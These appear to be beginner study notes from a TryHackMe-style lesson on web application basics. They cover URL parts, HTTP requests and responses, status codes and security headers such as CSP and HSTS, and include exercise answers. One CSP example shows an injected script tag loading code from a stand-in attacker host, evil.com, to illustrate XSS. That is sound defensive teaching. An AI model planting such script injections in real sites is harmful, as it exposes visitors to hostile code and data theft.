## Web Application Basics

Consider an analogy of a web application as a **planet**:  
- Astronauts travel to the planet to explore its surface → like how users browse a web app.  
- We usually only see the surface (web pages), but a lot happens beneath (servers, databases).  

#### Front End  
The **Front End** is like the surface of the planet – visible and interactive.  
Technologies: **HTML, CSS, JavaScript**  

- **HTML** → The DNA of the web page. Defines structure.  
- **CSS** → Appearance (colours, layouts, styling). Like an organism’s shape, texture, features.  
- **JavaScript** → The brain. Adds interactivity and decisions (dynamic behaviour).  

#### Back End  
The **Back End** is hidden but essential, like gravity and infrastructure.  
- **Databases** → Store, retrieve, modify data (like a library storing knowledge).  
- **Servers & Infrastructure** → Provide networking, storage, and application execution.  
- **WAF (Web Application Firewall)** → Like the ozone layer; protects against malicious requests.  

✅ **Summary**:  
- Frontend = Browser experience (HTML, CSS, JS).  
- Backend = Engine (Server, Database, WAF).  

**Q&A**  
- Which component hosts/delivers web apps? → **Web Server**  
- Which tool is used to access/interact? → **Web Browser**  
- Which protective layer filters malicious traffic? → **WAF**  

---

### 🔹 Uniform Resource Locator (URL)

A **URL** is a web address that guides the browser to a resource.  

#### Parts of a URL  
- **Scheme** → Protocol (HTTP, HTTPS). HTTPS = secure.  
- **User** → Rare today, but can include usernames (unsafe).  
- **Host/Domain** → The unique website address. Be cautious of **typosquatting** (e.g., `gooogle.com`).  
- **Port** → Doorway to service (80 = HTTP, 443 = HTTPS).  
- **Path** → The location of resource (`/login`).  
- **Query String** → Extra data (`?id=123`). Needs validation → injection risks.  
- **Fragment** → Jumps to section of page (`#about`).  

**Q&A**  
- Encrypted protocol for secure communication? → **HTTPS**  
- Misspelled domain attack? → **Typosquatting**  
- URL part that passes search terms/form inputs? → **Query String**  

---

### 🔹 HTTP Messages

HTTP = communication between **client** (browser) and **server**.  

- **Request** → Sent by client.  
- **Response** → Sent by server.  

#### Structure
- **Start Line** → Defines type (request/response).  
- **Headers** → Metadata (security, content, etc.).  
- **Empty Line** → Separator.  
- **Body** → Data (form inputs, HTML, API data).  

✅ **Why Important?**  
- Basis of web communication.  
- Helps diagnose performance/security issues.  

**Q&A**  
- Which message comes from server? → **HTTP Response**  
- What follows headers? → **Empty Line**  

---

### 🔹 HTTP Request: Request Line and Methods

The **Request Line** = Method + Path + HTTP Version.  

#### Methods & Security Notes  
- **GET** → Retrieve. Never put passwords/tokens in GET.  
- **POST** → Send data. Validate inputs (avoid SQLi, XSS).  
- **PUT** → Replace/update. Only for authorised users.  
- **DELETE** → Remove. Must require authorisation.  
- **PATCH** → Modify part of a resource. Validate carefully.  
- **HEAD** → Like GET but only headers.  
- **OPTIONS** → Shows allowed methods. Should be restricted.  
- **TRACE** → Debugging, usually disabled for security.  
- **CONNECT** → For HTTPS tunnels.  

#### Versions  
- HTTP/0.9 → Very basic.  
- HTTP/1.1 → Persistent connections. **Most common**.  
- HTTP/2 → Multiplexing, faster.  
- HTTP/3 → Secure + built on QUIC.  

**Q&A**  
- Most common HTTP version? → **HTTP/1.1**  
- Which method shows supported HTTP methods? → **OPTIONS**  
- Which part specifies target resource? → **URL Path**  

---

### 🔹 HTTP Request: Headers and Body

#### Common Request Headers  
- **Host** → Target server (`Host: tryhackme.com`).  
- **User-Agent** → Browser info.  
- **Referer** → Previous page.  
- **Cookie** → Stored data.  
- **Content-Type** → Data format.  

#### Request Body Formats  
```http
POST /profile HTTP/1.1
Host: tryhackme.com
Content-Type: application/x-www-form-urlencoded

name=Aleksandra&age=27&country=US
````

```http
POST /upload HTTP/1.1
Host: tryhackme.com
Content-Type: multipart/form-data; boundary=----XYZ

----XYZ
Content-Disposition: form-data; name="username"
aleksandra
----XYZ
Content-Disposition: form-data; name="profile_pic"; filename="aleksandra.jpg"
Content-Type: image/jpeg
[Binary Data]
----XYZ--
```

```http
POST /api/user HTTP/1.1
Content-Type: application/json

{
  "name": "Aleksandra",
  "age": 27,
  "country": "US"
}
```

```http
POST /api/user HTTP/1.1
Content-Type: application/xml

<user>
  <name>Aleksandra</name>
  <age>27</age>
  <country>US</country>
</user>
```

**Q\&A**

* Header specifying target domain? → **Host**
* Default form submission type? → **application/x-www-form-urlencoded**
* Where do headers like Host/User-Agent appear? → **Request Headers**

---

### 🔹 HTTP Response: Status Line and Status Codes

The **Status Line** = HTTP Version + Status Code + Reason Phrase.

#### Status Code Categories

* **1xx** → Info (Keep going).
* **2xx** → Success (200 OK).
* **3xx** → Redirection (301 Moved).
* **4xx** → Client error (404 Not Found).
* **5xx** → Server error (500 Internal Error).

**Common Codes**:

* `200 OK` → Success
* `301` → Moved permanently
* `404` → Not Found
* `500` → Server error

**Q\&A**

* First line of response? → **Status Line**
* Which category for server issues? → **5xx Server Error**
* Not found resource? → **404**

---

### 🔹 HTTP Response: Headers and Body

#### Key Response Headers

* **Date** → Time of response.
* **Content-Type** → Data type (HTML, JSON, etc.).
* **Server** → Web server software (can reveal info → risky).

#### Other Headers

* **Set-Cookie** → Stores session data. Use `HttpOnly` + `Secure`.
* **Cache-Control** → Controls caching (e.g., `no-cache`).
* **Location** → Used in redirects.

**Response Body** → Actual content (HTML, JSON, images). Must be sanitised to prevent XSS.

**Q\&A**

* Header exposing server info? → **Server**
* Cookie flag for HTTPS only? → **Secure**
* Cookie flag blocking JS access? → **HttpOnly**

---

### 🔹 Security Headers

Security headers add **extra defence layers** to prevent common attacks.

You can test headers with: [https://securityheaders.io](https://securityheaders.io).

#### Content-Security-Policy (CSP)

Helps block **XSS (Cross-Site Scripting)** by controlling allowed content sources.

Example:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'
```

* `default-src 'self'` → Allow only same domain content.
* `script-src` → Scripts only from own site + trusted CDN.
* `style-src` → CSS only from own domain.

💡 **Real-world example**:
If CSP is missing → An attacker injects `<script src="http://evil.com/malware.js">` into a comment box → browser runs it.
If CSP is enforced → Browser **blocks** this script since `evil.com` isn’t whitelisted.


#### Strict-Transport-Security (HSTS)

Forces browsers to use **HTTPS only** (prevents downgrade/MITM attacks).

Example:

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

* `max-age` → Time (seconds) to enforce HTTPS.
* `includeSubDomains` → Apply to all subdomains.
* `preload` → Add to browser preload lists (built-in security).

💡 **Real-world example**:
Without HSTS, an attacker can redirect a user from `https://bank.com` to `http://bank.com` (unencrypted).
With HSTS, browser **refuses HTTP** and auto-upgrades to HTTPS.


#### X-Content-Type-Options

Prevents browsers from **MIME sniffing** (guessing file type).

Example:

```http
X-Content-Type-Options: nosniff
```

* Stops browser from interpreting files differently.

💡 Example:
If a file uploaded as `.txt` actually has hidden JavaScript, a browser might misinterpret it. With `nosniff`, browser sticks to declared type.


#### Referrer-Policy

Controls how much **referrer info** is shared when clicking links.

Examples:

```http
Referrer-Policy: no-referrer
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
```

* `no-referrer` → No info shared.
* `same-origin` → Only share referrer within same site.
* `strict-origin` → Share only if HTTPS → HTTPS.
* `strict-origin-when-cross-origin` → Full path within same origin, but limited info across domains.

💡 Example:

* You’re on `https://secure-bank.com/dashboard`.
* If policy is weak → Visiting `http://evil.com` may send **full URL with session ID**.
* With `no-referrer` → **No sensitive data leaks**.


✅ Security Headers Summary

| Header                 | Protects Against                 | Example Config                                                            |
| ---------------------- | -------------------------------- | ------------------------------------------------------------------------- |
| CSP                    | XSS, code injection              | `default-src 'self'`                                                      |
| HSTS                   | SSL stripping, MITM              | `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` |
| X-Content-Type-Options | MIME sniffing                    | `nosniff`                                                                 |
| Referrer-Policy        | Referrer leakage                 | `no-referrer`                                                             |
| X-Frame-Options        | Clickjacking                     | `DENY`                                                                    |
| Permissions-Policy     | Abusing browser features         | `camera=(), geolocation=(self)`                                           |
| CORS                   | CSRF/data theft via cross-origin | `Access-Control-Allow-Origin: https://trusted.com`                        |
| COOP/COEP              | Side-channel, isolation bypass   | `same-origin`, `require-corp`                                             |
| Cache-Control          | Sensitive data caching           | `no-store, no-cache`                                                      |



**Q\&A**

* CSP property to define script sources? → **script-src**
* HSTS directive to apply to subdomains? → **includeSubDomains**
* Header preventing MIME sniffing? → **nosniff**

